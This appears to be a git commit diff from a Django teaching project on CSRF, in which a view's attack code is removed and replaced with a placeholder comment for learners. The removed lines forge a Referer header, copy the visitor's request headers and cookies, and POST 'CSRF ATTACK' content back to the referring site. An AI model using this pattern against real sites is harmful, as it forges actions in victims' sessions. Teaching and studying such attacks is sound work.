1c9bdf3e8b33dc0743eb2efaeccd19a80cea3385
MatsumotoKouta <kouta_matsumoto@demia.co.jp>
2024-07-03 21:50:06 +0900

    デプロイ用の修正

--- csrf_attack/views.py
+++ csrf_attack/views.py
@@ -2,22 +2,8 @@ from django.shortcuts import render
 
 import requests
 
+
 def teacher_list(request):
     template_name = "csrf_attack/teacher_list.html"
-
-    url = request.headers["Referer"]
-    referer = "http://127.0.0.1:8000/talkroom-list/"
-    content_type = "application/x-www-form-urlencoded"
-    headers = dict(request.headers)
-    headers["Referer"] = referer
-    headers["Content-Type"] = content_type
-    params = {
-        "content": "CSRF ATTACK",
-    }
-
-    requests.post(
-        url=url,
-        headers=headers,
-        data=params,
-    )
+    # ここに処理を記述
     return render(request, template_name)
